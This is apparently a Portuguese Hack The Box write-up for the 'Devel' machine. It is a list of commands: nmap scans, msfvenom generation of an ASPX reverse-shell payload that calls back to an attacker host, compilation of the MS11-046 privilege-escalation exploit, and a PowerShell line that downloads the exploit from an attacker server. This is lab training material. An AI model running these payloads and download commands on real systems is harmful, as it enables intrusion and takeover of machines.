# HTB - WRITE UP - DEVEL
## POC: https://www.redteamzone.seg.br/2022/10/devel-htb-writeup.html

# Enumeração 
## NMAP Geral
```
nmap -Pn -sV -p- --open [IP]
```

## NMAP específico para cada serviço 

## HTTP
```
nmap -Pn -p 80 -A [IP] 
```

## FTP
```
nmap -Pn -p 21 -A [IP]
```

## Web Shell SecList
```
/usr/share/seclists/Web-Shells/FuzzDB
```

## Reverse Shell ASPX
[+] Visualizando os formatos de arquivos no MSVenom
```
msfvenom --list formats
```
[+] Visualizando os payloads para windows no MSVenom
```
msfvenom --list payloads | grep windows
```
[+] Gerando payload para a shell reversa
```
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f aspx > rshell.aspx
```

## Enumeração Interna
```
systeminfo 
```

## Exploit
https://www.exploit-db.com/exploits/40564
```
searchsploit -w 40564
```

## MS11-046 - CVE-2011-1249 - AFD Privilege Escalation
https://nvd.nist.gov/vuln/detail/CVE-2011-1249

https://learn.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046


## Verifica se o mingw está instalado
```
apt list --installed
```

## Compilando o exploit
```
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

## Powershell para download 
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[IP]:8080/40564.exe', 'c:\inetpub\wwwroot\teste\40564.exe')"
```
